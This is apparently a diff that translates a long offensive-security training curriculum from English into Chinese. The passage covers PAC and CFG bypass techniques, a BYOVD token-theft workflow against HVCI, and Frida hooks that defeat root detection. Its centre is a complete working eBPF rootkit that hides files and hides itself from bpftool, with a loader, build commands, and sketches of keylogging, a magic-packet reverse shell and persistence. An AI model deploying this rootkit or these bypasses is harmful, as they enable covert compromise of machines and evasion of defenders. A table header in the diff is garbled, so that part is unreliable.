-   - FORCEDENTRY: data-only font parsing exploit chain on iOS 14.x
+4. 真实案例：
+   - CVE-2021-30955（iOS 15 沙箱逃逸）：仅数据类型混淆
+     通过 ipc_port_t 与受控分配重叠
+   - Ian Beer 的《A deep dive into an NSO zero-click iMessage exploit》：
+     记录了启用 PAC 设备上的仅数据原语
+   - FORCEDENTRY：iOS 14.x 上的仅数据字体解析利用链
 
-5. ORACLE ATTACK (advanced -- requires information leak):
-   Some gadgets RETURN a signed pointer readable from userspace.
-   If you can call such a gadget with controlled input and read the output,
-   you have a signing oracle. Use it to forge arbitrary signed pointers.
-   This requires a kernel-level bug with a leak primitive.
-   Reference: Brandon Azad's work on PAC bypass primitives.
+5. 预言机攻击（高级——需要信息泄露）：
+   某些 gadget 会返回可从用户态读取的已签名指针。
+   如果你能用受控输入调用这样的 gadget 并读取输出，
+   你就拥有了签名预言机。用它伪造任意已签名指针。
+   这需要带有泄露原语的内核级缺陷。
+   参考：Brandon Azad 关于 PAC 绕过原语的工作。
 ```
 
 ---
 
-## BLOCK 11: CONTROL FLOW GUARD BYPASS
+## 区块 11：控制流保护（CFG）绕过
 
-**Time: 1-2 weeks | Difficulty: Extreme**
+**时间：1-2 周 | 难度：极限**
 
-### How CFG Works Internally
+### CFG 内部工作原理
 
 ```
-CFG maintains a BITMAP in memory indexed by target address >> 3.
-Every call site compiled with /guard:cf emits:
-  CALL  __guard_check_icall_fptr   ; validate the target
-  CALL  rax                        ; make the actual call
+CFG 在内存中维护一个以目标地址 >> 3 为索引的位图。
+每个用 /guard:cf 编译的调用点都会生成：
+  CALL  __guard_check_icall_fptr   ; 校验目标
+  CALL  rax                        ; 执行实际调用
 
 __guard_check_icall_fptr:
-  Looks up target_addr in bitmap
-  If NOT present: crash
-  If present:     return (allow the call)
+  在位图中查找 target_addr
+  如果不存在：崩溃
+  如果存在：    返回（允许调用）
 
-Valid targets = the set of all functions compiled with /guard:cf.
-Indirect calls can only land at valid CFG targets.
+有效目标 = 所有用 /guard:cf 编译的函数集合。
+间接调用只能落在有效的 CFG 目标上。
 ```
 
-### JIT Spray + Type Confusion Bypass
+### JIT 喷洒 + 类型混淆绕过
 
 ```cpp
-// File: cfg_bypass_type_confusion.cpp
-// Technique: corrupt a vtable pointer to a DIFFERENT valid CFG function.
-// CFG validates the TARGET -- but not whether it's the RIGHT method for THAT type.
+// 文件：cfg_bypass_type_confusion.cpp
+// 技术：将 vtable 指针破坏为指向另一个有效的 CFG 函数。
+// CFG 校验的是目标——但不校验它是否是该类型对应的正确方法。
 
 class TypeA {
     virtual void method_one() { safe_operation(); }
-    // vtable entry at offset 0: &TypeA::method_one -- CFG bitmap: YES
+    // 偏移 0 处的 vtable 条目：&TypeA::method_one——CFG 位图：是
 };
 
 class TypeB {
     virtual void interesting_func() { privileged_operation(); }
-    // vtable entry at offset 0: &TypeB::interesting_func -- CFG bitmap: YES
+    // 偏移 0 处的 vtable 条目：&TypeB::interesting_func——CFG 位图：是
 };
 
 void exploit_type_confusion(TypeA *confused) {
-    // Corrupt confused->vptr to point to TypeB's vtable:
+    // 将 confused->vptr 破坏为指向 TypeB 的 vtable：
     *(void**)confused = (void*)TypeB_vtable_address;
 
-    // When caller does: confused->method_one()
-    // -> CFG check: is TypeB::interesting_func a valid target? YES (it IS in bitmap)
-    // -> Calls TypeB::interesting_func instead of TypeA::method_one
-    // -> PAC (if present) would still catch this -- CFG alone does not.
+    // 当调用方执行：confused->method_one()
+    // -> CFG 检查：TypeB::interesting_func 是有效目标吗？是（它确实在位图中）
+    // -> 调用 TypeB::interesting_func 而不是 TypeA::method_one
+    // -> 若存在 PAC，仍会捕获这一点——仅靠 CFG 不行。
 
-    confused->method_one();   // actually calls TypeB::interesting_func
+    confused->method_one();   // 实际调用 TypeB::interesting_func
 }
 
-// This bypasses CFG because:
-// 1. The call target IS in the CFG bitmap (it's a real named function)
-// 2. CFG does not check type -- only address validity
-// 3. We get to call a different function, constrained to CFG-valid set
-// Combine with carefully chosen "interesting" CFG-valid functions.
+// 这能绕过 CFG，因为：
+// 1. 调用目标确实在 CFG 位图中（它是一个真实命名的函数）
+// 2. CFG 不检查类型——只检查地址有效性
+// 3. 我们可以调用不同的函数，但被限制在 CFG 有效集合内
+// 与精心挑选的 "interesting" CFG 有效函数结合使用。
 ```
 
 ```bash
-# Find CFG-valid targets in a binary:
-# Using PE-bear or dumpbin:
+# 在二进制中查找 CFG 有效目标：
+# 使用 PE-bear 或 dumpbin：
 dumpbin /loadconfig binary.exe | findstr "Guard CF Function"
-# Or: use cfgexplorer (Python tool):
+# 或：使用 cfgexplorer（Python 工具）：
 pip install pefile
 python3 -c "
 import pefile
@@ -2314,50 +2314,50 @@ if hasattr(pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
 
 ---
 
-## BLOCK 12: LINUX EBPF ROOTKITS + ANTI-DETECTION
+## 区块 12：Linux eBPF 后门 + 反检测
 
-**Time: 4-6 weeks | MITRE: T1014 | Detection Difficulty: Extreme**
+**时间：4-6 周 | MITRE：T1014 | 检测难度：极限**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+### 资源
 |---|---|---|---|---|
-| [ebpfkit](https://github.com/Gui774ume/ebpfkit) | GitHub | 5 hrs | FREE | Study every technique. Read all source files. |
-| [Tetragon (Cilium)](https://github.com/cilium/tetragon) | GitHub | 3 hrs | FREE | Study the DEFENSE to understand the offense. |
-| [eBPF Security BlackHat 2023+](https://www.youtube.com/results?search_query=ebpf+security+blackhat+2023) | YouTube | 4 hrs | FREE | Watch anything 2022-2024. |
-| [libbpf bootstrap](https://github.com/libbpf/libbpf-bootstrap) | GitHub | 2 hrs | FREE | Modern eBPF project skeleton. Start here. |
+| [ebpfkit](https://github.com/Gui774ume/ebpfkit) | GitHub | 5 小时 | 免费 | 研究每种技术。阅读所有源文件。 |
+| [Tetragon（Cilium）](https://github.com/cilium/tetragon) | GitHub | 3 小时 | 免费 | 研究防御以理解攻击。 |
+| [eBPF 安全 BlackHat 2023+](https://www.youtube.com/results?search_query=ebpf+security+blackhat+2023) | YouTube | 4 小时 | 免费 | 观看 2022-2024 年的任何相关内容。 |
+| [libbpf bootstrap](https://github.com/libbpf/libbpf-bootstrap) | GitHub | 2 小时 | 免费 | 现代 eBPF 项目骨架。从这里开始。 |
 
-### eBPF Architecture Overview
+### eBPF 架构概览
 
 ```
-eBPF (extended Berkeley Packet Filter):
-  Original purpose: networking and observability
-  Abused for: nearly-undetectable rootkits that require NO kernel module
+eBPF（扩展伯克利包过滤器）：
+  最初用途：网络与可观测性
+  被滥用为：几乎无法检测、且不需要任何内核模块的后门
 
-REQUIREMENTS:
-  - CAP_BPF or CAP_SYS_ADMIN (root, or privileged container)
-  - Linux kernel >= 4.18 for most features; >= 5.7 for full BPF_LINK support
+要求：
+  - CAP_BPF 或 CAP_SYS_ADMIN（root，或特权容器）
+  - Linux 内核 >= 4.18 支持大多数特性；>= 5.7 支持完整的 BPF_LINK
 
-ADVANTAGES OVER LKM ROOTKITS:
-  - No .ko file on disk (unless pinned to /sys/fs/bpf/)
-  - Survives across kernel versions (stable helper APIs)
-  - Can hook after the fact (attach/detach without reboot)
-  - Can defend against bpftool detection by hooking bpftool's own output
+相对于 LKM 后门的优势：
+  - 磁盘上没有 .ko 文件（除非固定到 /sys/fs/bpf/）
+  - 可跨内核版本存活（稳定的 helper API）
+  - 可以事后挂钩（无需重启即可附加/分离）
+  - 可以通过挂钩 bpftool 自身的输出来防御 bpftool 检测
 
-HOOK POINTS:
-  Tracepoints:    stable kernel trace points (sys_enter_execve, sys_exit_getdents64)
-  kprobes:        dynamic hook on any kernel function
-  uprobes:        hook on userspace function in any process
-  XDP:            hook at NIC driver level (before kernel network stack)
-  TC:             hook on network ingress/egress
-  fentry/fexit:   BPF trampolines -- faster than kprobes, kernel 5.5+
+挂钩点：
+  Tracepoints：    稳定的内核跟踪点（sys_enter_execve、sys_exit_getdents64）
+  kprobes：        对任意内核函数的动态挂钩
+  uprobes：        挂钩任意进程中的用户态函数
+  XDP：            在网卡驱动层挂钩（位于内核网络栈之前）
+  TC：             在网络入口/出口挂钩
+  fentry/fexit：   BPF trampoline——比 kprobes 更快，内核 5.5+
 ```
 
-### Complete Working eBPF File-Hide Rootkit
+### 完整可用的 eBPF 文件隐藏后门
 
 ```c
-// File: rootkit.bpf.c
-// Build: clang -O2 -target bpf -c rootkit.bpf.c -o rootkit.bpf.o
+// 文件：rootkit.bpf.c
+// 构建：clang -O2 -target bpf -c rootkit.bpf.c -o rootkit.bpf.o
 
 #include <linux/bpf.h>
 #include <linux/types.h>
@@ -2366,7 +2366,7 @@ HOOK POINTS:
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
 
-// Map: filename to hide -> 1
+// 映射：要隐藏的文件名 -> 1
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __type(key,  char[64]);
@@ -2374,7 +2374,7 @@ struct {
     __uint(max_entries, 256);
 } hidden_files SEC(".maps");
 
-// Map: save getdents64 args between sys_enter and sys_exit
+// 映射：在 sys_enter 与 sys_exit 之间保存 getdents64 参数
 struct getdents64_args {
     unsigned int fd;
     struct linux_dirent64 __user *dirp;
@@ -2388,7 +2388,7 @@ struct {
     __uint(max_entries, 1024);
 } args_map SEC(".maps");
 
-// Hook 1: save arguments on entry
+// 挂钩 1：在入口处保存参数
 SEC("tp/syscalls/sys_enter_getdents64")
 int hook_enter_getdents64(struct trace_event_raw_sys_enter *ctx) {
     __u64 pid_tgid = bpf_get_current_pid_tgid();
@@ -2402,7 +2402,7 @@ int hook_enter_getdents64(struct trace_event_raw_sys_enter *ctx) {
     return 0;
 }
 
-// Hook 2: filter returned directory entries
+// 挂钩 2：过滤返回的目录项
 SEC("tp/syscalls/sys_exit_getdents64")
 int hook_exit_getdents64(struct trace_event_raw_sys_exit *ctx) {
     __u64 pid_tgid = bpf_get_current_pid_tgid();
@@ -2450,7 +2450,7 @@ int hook_exit_getdents64(struct trace_event_raw_sys_exit *ctx) {
                         &prev_reclen, sizeof(__u16));
                 }
             } else {
-                // First entry: mark inode 0 (glibc readdir skips ino=0)
+                // 第一个条目：将 inode 标记为 0（glibc readdir 会跳过 ino=0）
                 __u64 zero_ino = 0;
                 bpf_probe_write_user((void *)dirp + pos, &zero_ino, sizeof(__u64));
             }
@@ -2468,23 +2468,23 @@ int hook_exit_getdents64(struct trace_event_raw_sys_exit *ctx) {
 char LICENSE[] SEC("license") = "GPL";
 ```
 
-### eBPF Anti-Detection -- Hiding from bpftool (GAP CLOSED)
+### eBPF 反检测——对 bpftool 隐藏（缺口已补齐）
 
-The file-hiding rootkit above is detectable: `bpftool prog list` shows our loaded programs. The following section adds self-hiding by intercepting the `bpf()` syscall when `bpftool` queries the program list.
+上面的文件隐藏后门是可以被检测到的：`bpftool prog list` 会显示我们已加载的程序。下一节通过拦截 `bpftool` 查询程序列表时的 `bpf()` 系统调用来增加自我隐藏。
 
 ```c
-// File: rootkit_selfhide.bpf.c
-// Purpose: hide our eBPF programs from bpftool prog list
-// Technique: hook bpf(BPF_PROG_QUERY) and filter our program IDs from results
+// 文件：rootkit_selfhide.bpf.c
+// 目的：对 bpftool prog list 隐藏我们的 eBPF 程序
+// 技术：挂钩 bpf(BPF_PROG_QUERY) 并从结果中过滤我们的程序 ID
 //
-// HOW bpftool works:
-//   bpftool calls bpf(BPF_PROG_GET_NEXT_ID, ...) in a loop to enumerate all program IDs.
-//   It then calls bpf(BPF_OBJ_GET_INFO_BY_FD, ...) for each ID to get details.
-//   We intercept BPF_PROG_GET_NEXT_ID to skip our own program IDs.
+// bpftool 如何工作：
+//   bpftool 在循环中调用 bpf(BPF_PROG_GET_NEXT_ID, ...) 来枚举所有程序 ID。
+//   然后对每个 ID 调用 bpf(BPF_OBJ_GET_INFO_BY_FD, ...) 获取详情。
+//   我们拦截 BPF_PROG_GET_NEXT_ID 以跳过我们自己的程序 ID。
 //
-// NOTE: This requires CONFIG_BPF_SYSCALL and kernel >= 5.3 for reliable behavior.
-//       The sys_bpf tracepoint may not exist on all kernels;
-//       use kprobe on __sys_bpf as fallback.
+// 注意：这需要 CONFIG_BPF_SYSCALL 和内核 >= 5.3 才能可靠工作。
+//       sys_bpf 跟踪点可能并非所有内核都存在；
+//       可用 __sys_bpf 上的 kprobe 作为回退。
 
 #include <linux/bpf.h>
 #include <linux/types.h>
@@ -2492,15 +2492,15 @@ The file-hiding rootkit above is detectable: `bpftool prog list` shows our loade
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
 
-// Map: set of program IDs to hide (populated by userspace loader at startup)
+// 映射：要隐藏的程序 ID 集合（由用户态加载器在启动时填充）
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
-    __type(key,  __u32);   // program ID
-    __type(value, __u8);   // 1 = hide
+    __type(key,  __u32);   // 程序 ID
+    __type(value, __u8);   // 1 = 隐藏
     __uint(max_entries, 64);
 } hidden_prog_ids SEC(".maps");
 
-// Map: pid_tgid -> struct bpf_attr __user * (save args for BPF_PROG_GET_NEXT_ID calls)
+// 映射：pid_tgid -> struct bpf_attr __user *（保存 BPF_PROG_GET_NEXT_ID 调用的参数）
 struct bpf_getnextid_args {
     int       cmd;
     void __user *attr_ptr;
@@ -2514,13 +2514,13 @@ struct {
     __uint(max_entries, 512);
 } bpf_call_args SEC(".maps");
 
-// bpf() syscall command constants (from linux/bpf.h):
+// bpf() 系统调用命令常量（来自 linux/bpf.h）：
 #define BPF_PROG_GET_NEXT_ID  11
 #define BPF_PROG_GET_FD_BY_ID 13
 
-// bpf_attr for BPF_PROG_GET_NEXT_ID:
+// BPF_PROG_GET_NEXT_ID 的 bpf_attr：
 // struct { __u32 start_id; __u32 next_id; ... };
-// next_id is the OUTPUT: kernel writes the next program ID here.
+// next_id 是输出：内核在此写入下一个程序 ID。
 
 SEC("tp/syscalls/sys_enter_bpf")
 int hook_bpf_enter(struct trace_event_raw_sys_enter *ctx) {
@@ -2542,7 +2542,7 @@ int hook_bpf_enter(struct trace_event_raw_sys_enter *ctx) {
 SEC("tp/syscalls/sys_exit_bpf")
 int hook_bpf_exit(struct trace_event_raw_sys_exit *ctx) {
     long ret = ctx->ret;
-    if (ret != 0) return 0;   // only intercept successful calls
+    if (ret != 0) return 0;   // 只拦截成功的调用
 
     __u64 pid_tgid = bpf_get_current_pid_tgid();
     struct bpf_getnextid_args *saved = bpf_map_lookup_elem(&bpf_call_args, &pid_tgid);
@@ -2553,29 +2553,29 @@ int hook_bpf_exit(struct trace_event_raw_sys_exit *ctx) {
     bpf_map_delete_elem(&bpf_call_args, &pid_tgid);
 
     if (cmd == BPF_PROG_GET_NEXT_ID) {
-        // The kernel wrote next_id at attr->next_id (offset 4 in bpf_attr)
+        // 内核将 next_id 写在 attr->next_id（bpf_attr 中的偏移 4）
         __u32 next_id = 0;
         if (bpf_probe_read_user(&next_id, sizeof(__u32), attr_ptr + 4) != 0)
             return 0;
 
-        // Check if next_id is one we want to hide:
+        // 检查 next_id 是否是我们想隐藏的：
         __u8 *hide = bpf_map_lookup_elem(&hidden_prog_ids, &next_id);
         if (!hide || *hide != 1)
             return 0;
 
-        // HIDE: We need to skip this ID by asking the kernel for the ID AFTER next_id.
-        // We cannot call bpf() from within eBPF (no nested bpf syscall from BPF).
-        // Alternative: set next_id to 0 (invalid) to confuse the enumerator.
-        // A more robust approach: write a sentinel value that userspace loader
-        // translates to "continue iterating" -- requires a cooperating userspace shim.
+        // 隐藏：我们需要通过向内核请求 next_id 之后的 ID 来跳过它。
+        // 我们不能在 eBPF 内部调用 bpf()（BPF 中不允许嵌套 bpf 系统调用）。
+        // 替代方案：将 next_id 设为 0（无效）以迷惑枚举器。
+        // 更稳健的方法：写入一个哨兵值，由用户态加载器
+        // 将其翻译为“继续迭代”——需要一个配合的用户态 shim。
         //
-        // PRACTICAL IMPLEMENTATION:
-        // Option A (simple): overwrite next_id with 0xFFFFFFFF (invalid ID)
-        //   -> bpftool sees ENOENT on next call -> stops enumeration early.
-        //   -> CAVEAT: hides ALL subsequent programs, not just ours.
+        // 实际实现：
+        // 方案 A（简单）：用 0xFFFFFFFF（无效 ID）覆盖 next_id
+        //   -> bpftool 在下一次调用时看到 ENOENT -> 提前结束枚举。
+        //   -> 注意：会隐藏所有后续程序，而不仅仅是我们的。
         //
-        // Option B (clean): use a userspace shim that wraps bpf() and filters IDs.
-        //   See: companion loader below (bpftool_shim.py).
+        // 方案 B（干净）：使用包装 bpf() 并过滤 ID 的用户态 shim。
+        //   参见：下方的配套加载器（bpftool_shim.py）。
 
         __u32 invalid_id = 0xFFFFFFFF;
         bpf_probe_write_user(attr_ptr + 4, &invalid_id, sizeof(__u32));
@@ -2589,22 +2589,22 @@ char LICENSE[] SEC("license") = "GPL";
 
 ```python
 #!/usr/bin/env python3
-# File: bpftool_shim.py
-# Purpose: userspace shim that wraps bpf() to filter our program IDs.
-# Run this INSTEAD of bpftool to verify the rootkit is hidden.
-# In a real deployment: LD_PRELOAD this shim to intercept bpf() in any process.
+# 文件：bpftool_shim.py
+# 目的：包装 bpf() 以过滤我们程序 ID 的用户态 shim。
+# 运行此脚本而不是 bpftool，以验证后门已隐藏。
+# 在真实部署中：用 LD_PRELOAD 加载此 shim，以拦截任意进程中的 bpf()。
 
-# Our own program IDs to hide (populated after loading rootkit.bpf.o):
-HIDDEN_IDS = set()   # filled in by the loader script below
+# 我们自己的、要隐藏的程序 ID（在加载 rootkit.bpf.o 后填充）：
+HIDDEN_IDS = set()   # 由下方的加载器脚本填充
 
 import ctypes
 import ctypes.util
 
-# Load libc for direct syscall access:
+# 加载 libc 以便直接进行系统调用：
 libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
 
 BPF_PROG_GET_NEXT_ID = 11
-NR_bpf = 321   # x86-64 syscall number
+NR_bpf = 321   # x86-64 系统调用号
 
 class BpfAttrGetNextId(ctypes.Structure):
     _fields_ = [("start_id", ctypes.c_uint32),
@@ -2615,11 +2615,11 @@ def bpf_prog_get_next_id(start_id=0):
     ret  = libc.syscall(NR_bpf, BPF_PROG_GET_NEXT_ID,
                         ctypes.byref(attr), ctypes.sizeof(attr))
     if ret < 0:
-        return None   # ENOENT = no more programs
+        return None   # ENOENT = 没有更多程序
     return attr.next_id
 
 def list_visible_prog_ids(hidden_ids):
-    """List all program IDs, skipping hidden_ids."""
+    """列出所有程序 ID，跳过 hidden_ids。"""
     visible = []
     cur_id  = 0
     while True:
@@ -2641,9 +2641,9 @@ if __name__ == "__main__":
 ```
 
 ```c
-// File: loader_full.c -- Userspace loader for file-hide + self-hide rootkits
-// Compile: gcc -o loader_full loader_full.c -lbpf
-// Run:     sudo ./loader_full secret.txt
+// 文件：loader_full.c——文件隐藏 + 自我隐藏后门的用户态加载器
+// 编译：gcc -o loader_full loader_full.c -lbpf
+// 运行：sudo ./loader_full secret.txt
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -2659,7 +2659,7 @@ int main(int argc, char *argv[]) {
     }
     const char *target = argv[1];
 
-    // ---- Load file-hide rootkit -----------------------------------------------
+    // ---- 加载文件隐藏后门 -----------------------------------------------
     struct bpf_object *obj_fh = bpf_object__open("rootkit.bpf.o");
     bpf_object__load(obj_fh);
 
@@ -2668,14 +2668,14 @@ int main(int argc, char *argv[]) {
     struct bpf_link *link_e = bpf_program__attach(prog_enter);
     struct bpf_link *link_x = bpf_program__attach(prog_exit);
 
-    // Add target file to hidden_files map:
+    // 将目标文件加入 hidden_files 映射：
     int map_fh_fd = bpf_object__find_map_fd_by_name(obj_fh, "hidden_files");
     char key[64] = {};
     __u8  val    = 1;
     strncpy(key, target, 63);
     bpf_map_update_elem(map_fh_fd, key, &val, BPF_ANY);
 
-    // ---- Load self-hide rootkit -----------------------------------------------
+    // ---- 加载自我隐藏后门 -----------------------------------------------
     struct bpf_object *obj_sh = bpf_object__open("rootkit_selfhide.bpf.o");
     bpf_object__load(obj_sh);
 
@@ -2684,7 +2684,7 @@ int main(int argc, char *argv[]) {
     struct bpf_link *link_be = bpf_program__attach(prog_bpf_enter);
     struct bpf_link *link_bx = bpf_program__attach(prog_bpf_exit);
 
-    // Get IDs of our own programs and add to hidden_prog_ids:
+    // 获取我们自己程序的 ID 并加入 hidden_prog_ids：
     int map_sh_fd = bpf_object__find_map_fd_by_name(obj_sh, "hidden_prog_ids");
 
     struct bpf_program *progs[] = {
@@ -2709,7 +2709,7 @@ int main(int argc, char *argv[]) {
 
     while (1) sleep(60);
 
-    // Cleanup on signal:
+    // 收到信号时清理：
     bpf_link__destroy(link_e);  bpf_link__destroy(link_x);
     bpf_link__destroy(link_be); bpf_link__destroy(link_bx);
     bpf_object__close(obj_fh);  bpf_object__close(obj_sh);
@@ -2718,63 +2718,63 @@ int main(int argc, char *argv[]) {
 ```
 
 ```bash
-# Build both rootkit components:
+# 构建后门的两个组件：
 sudo apt install clang libbpf-dev bpftool
 
 clang -O2 -target bpf -c rootkit.bpf.c -o rootkit.bpf.o
 clang -O2 -target bpf -c rootkit_selfhide.bpf.c -o rootkit_selfhide.bpf.o
 gcc -o loader_full loader_full.c -lbpf
 
-# Test:
+# 测试：
 echo "secret data" > secret.txt
 
-# Before loading:
-sudo bpftool prog list   # shows existing programs only
+# 加载前：
+sudo bpftool prog list   # 仅显示已存在的程序
 
-# Load rootkit:
+# 加载后门：
 sudo ./loader_full secret.txt &
 
-# Verify file hiding:
-ls                       # secret.txt is GONE
-cat secret.txt           # still readable
+# 验证文件隐藏：
+ls                       # secret.txt 消失了
+cat secret.txt           # 仍然可读
 
-# Verify self-hiding:
-sudo bpftool prog list   # our programs do NOT appear
+# 验证自我隐藏：
+sudo bpftool prog list   # 我们的程序不会出现
 
-# Verify they ARE running (via /sys/fs/bpf if pinned, or via dmesg):
-sudo cat /proc/self/fdinfo/*  # raw kernel interface bypasses our hook
+# 验证它们确实在运行（如果已固定，可通过 /sys/fs/bpf，或通过 dmesg）：
+sudo cat /proc/self/fdinfo/*  # 原始内核接口绕过了我们的挂钩
 ```
 
-### eBPF Rootkit Capabilities
+### eBPF 后门能力
 
 ```
-Beyond file hiding:
+除了文件隐藏之外：
 
-PROCESS HIDING:
-  Hook getdents64 on /proc -> remove /proc/<PID> from directory listing
-  Same pattern as file hiding, filter by pid directory names.
+进程隐藏：
+  挂钩 /proc 上的 getdents64 -> 从目录列表中移除 /proc/<PID>
+  与文件隐藏相同的模式，按 pid 目录名过滤。
 
-NETWORK BACKDOOR (XDP):
-  XDP hooks at NIC driver level -- BEFORE kernel network stack.
-  Completely invisible to tcpdump (runs above XDP).
-  Use: receive magic packet -> trigger reverse shell or privilege escalation.
+网络后门（XDP）：
+  XDP 在网卡驱动层挂钩——位于内核网络栈之前。
+  对 tcpdump 完全不可见（它运行在 XDP 之上）。
+  用途：接收魔术包 -> 触发反弹 shell 或权限提升。
 
-KEYLOGGING:
-  Hook read() on /dev/tty, /dev/pts/* (terminal devices).
-  Every keystroke passes through read() -> capture at hook point.
+键盘记录：
+  挂钩 /dev/tty、/dev/pts/*（终端设备）上的 read()。
+  每次按键都会经过 read() -> 在挂钩点捕获。
 
-PERSISTENCE:
-  Pin BPF programs to /sys/fs/bpf/:
+持久化：
+  将 BPF 程序固定到 /sys/fs/bpf/：
     bpf_link__pin(link, "/sys/fs/bpf/my_rootkit");
-  Program survives process exit.
-  Boot persistence: systemd service that runs loader at boot.
+  程序在进程退出后仍存活。
+  启动持久化：在开机时运行加载器的 systemd 服务。
 ```
 
 ---
 
-## BLOCK 13: HVCI, VBS AND KERNEL SECURITY 2026-2027
+## 区块 13：HVCI、VBS 与 2026-2027 内核安全
 
-### Architecture Overview
+### 架构概览
 
 <div align="center">
 <table><tr><td>
@@ -2787,72 +2787,72 @@ PERSISTENCE:
 ---
 
 
-### What HVCI Kills vs What Survives
+### HVCI 终止了什么，什么能存活
 
 ```
-KILLED by HVCI:
-  - Unsigned kernel-mode code injection (shellcode in pool/stack: BLOCKED)
-  - Classic rootkits loading unsigned .sys drivers: BLOCKED
-  - Kernel shellcode execution even with ring-0 write primitive: BLOCKED
-  - Code patching of kernel .text section: BLOCKED
+HVCI 终止的：
+  - 未签名内核态代码注入（池/栈中的 shellcode：被阻断）
+  - 加载未签名 .sys 驱动的经典后门：被阻断
+  - 即使拥有 ring-0 写原语的内核 shellcode 执行：被阻断
+  - 对内核 .text 段的代码补丁：被阻断
 
-SURVIVES HVCI:
-  - BYOVD with HVCI-compatible signed drivers (no code injection, data R/W only)
-  - Data-only attacks: corrupt EPROCESS.Token, credential structures
-  - Hypervisor rootkit (Ring -1): own the hypervisor ABOVE VTL1
-  - Firmware attacks: UEFI rootkit runs BEFORE Hyper-V loads
-  - Signed but vulnerable drivers with arbitrary R/W IOCTLs (loldrivers.io)
+在 HVCI 下存活的：
+  - 使用 HVCI 兼容的已签名驱动进行 BYOVD（不注入代码，仅数据读/写）
+  - 仅数据攻击：破坏 EPROCESS.Token、凭据结构
+  - Hypervisor 后门（Ring -1）：拥有 VTL1 之上的 hypervisor
+  - 固件攻击：UEFI 后门在 Hyper-V 加载之前运行
+  - 已签名但存在漏洞、带任意读/写 IOCTL 的驱动（loldrivers.io）
 
-THE ATTACK HIERARCHY (2026-2027):
-  Ring 3 (user)    -> Ring 0 (kernel, requires vulnerability)
-  Ring 0           -> Ring -1 (hypervisor, requires UEFI/boot vulnerability)
-  Ring -1          -> full control, HVCI irrelevant
-  UEFI             -> persists across OS reinstall
+攻击层级（2026-2027）：
+  Ring 3（用户）    -> Ring 0（内核，需要漏洞）
+  Ring 0           -> Ring -1（hypervisor，需要 UEFI/启动漏洞）
+  Ring -1          -> 完全控制，HVCI 无关紧要
+  UEFI             -> 跨操作系统重装持久化
 
-BYOVD WORKFLOW AGAINST HVCI:
-  1. Load signed, HVCI-compatible driver with arbitrary read/write IOCTL
-  2. Use read primitive: read EPROCESS of System process
-  3. Extract System's Token value
-  4. Use write primitive: write System's Token to current process's EPROCESS.Token
-  5. All in DATA space -- no code execution in kernel, HVCI does not fire
-  6. Process now has SYSTEM token -- spawn shell
+针对 HVCI 的 BYOVD 工作流程：
+  1. 加载带任意读/写 IOCTL 的已签名、HVCI 兼容驱动
+  2. 使用读原语：读取 System 进程的 EPROCESS
+  3. 提取 System 的 Token 值
+  4. 使用写原语：将 System 的 Token 写入当前进程的 EPROCESS.Token
+  5. 全程在数据空间——内核中无代码执行，HVCI 不会触发
+  6. 进程现在拥有 SYSTEM 令牌——生成 shell
 ```
 
 ---
 
-## BLOCK 14: MOBILE SECURITY -- ANDROID AND iOS
+## 区块 14：移动安全 -- Android 与 iOS
 
-**Time: 6-8 weeks | Difficulty: Very Hard**
+**时间：6-8 周 | 难度：非常难**
 
-### Android Security Resources
+### Android 安全资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [OWASP MASTG Android](https://mas.owasp.org/MASTG/Android/) | Guide | 8 hrs | FREE | Comprehensive Android security assessment |
-| [Frida Documentation](https://frida.re/docs/android/) | Docs | 3 hrs | FREE | Official Android Frida guide |
-| [Android Security Internals (Elenkov)](https://nostarch.com/androidsecurity) | Book | 15 hrs | PAID | Deep dive into Android security architecture |
-| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | Tool | 2 hrs | FREE | Automated mobile app analysis |
+| [OWASP MASTG Android](https://mas.owasp.org/MASTG/Android/) | 指南 | 8 小时 | 免费 | 全面的 Android 安全评估 |
+| [Frida 文档](https://frida.re/docs/android/) | 文档 | 3 小时 | 免费 | Android Frida 官方指南 |
+| [Android 安全内部结构（Elenkov）](https://nostarch.com/androidsecurity) | 书籍 | 15 小时 | 付费 | 深入 Android 安全架构 |
+| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | 工具 | 2 小时 | 免费 | 自动化移动应用分析 |
 
-### Android Dynamic Analysis
+### Android 动态分析
 
 ```bash
-# Setup: rooted Android device or emulator
-# Install frida-server on device:
+# 环境准备：已 root 的 Android 设备或模拟器
+# 在设备上安装 frida-server：
 adb push frida-server /data/local/tmp/
 adb shell chmod +x /data/local/tmp/frida-server
 adb shell /data/local/tmp/frida-server &
 
-# List running apps:
+# 列出正在运行的应用：
 frida-ps -U
 
-# Attach to app:
+# 附加到应用：
 frida -U -f com.target.app --no-pause -l hook_android.js
 ```
 
 ```javascript
-// hook_android.js -- Android Java and native hooks
+// hook_android.js——Android Java 与原生挂钩
 
-// Hook Java methods:
+// 挂钩 Java 方法：
 Java.perform(function() {
     var Activity = Java.use('android.app.Activity');
     Activity.onCreate.overload('android.os.Bundle').implementation = function(bundle) {
@@ -2860,7 +2860,7 @@ Java.perform(function() {
         this.onCreate(bundle);
     };
 
-    // Hook encryption to capture plaintext:
+    // 挂钩加密以捕获明文：
     var Cipher = Java.use('javax.crypto.Cipher');
     Cipher.doFinal.overload('[B').implementation = function(input) {
         console.log('[*] Cipher.doFinal input: ' + hexdump(input));
@@ -2869,7 +2869,7 @@ Java.perform(function() {
         return result;
     };
 
-    // Bypass root detection:
+    // 绕过 root 检测：
     var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
     RootBeer.isRooted.implementation = function() {
         console.log('[*] isRooted bypass: returning false');
@@ -2878,43 +2878,43 @@ Java.perform(function() {
 });
 ```
 
-### iOS Security Resources
+### iOS 安全资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [OWASP MASTG iOS](https://mas.owasp.org/MASTG/iOS/) | Guide | 8 hrs | FREE | Comprehensive iOS assessment |
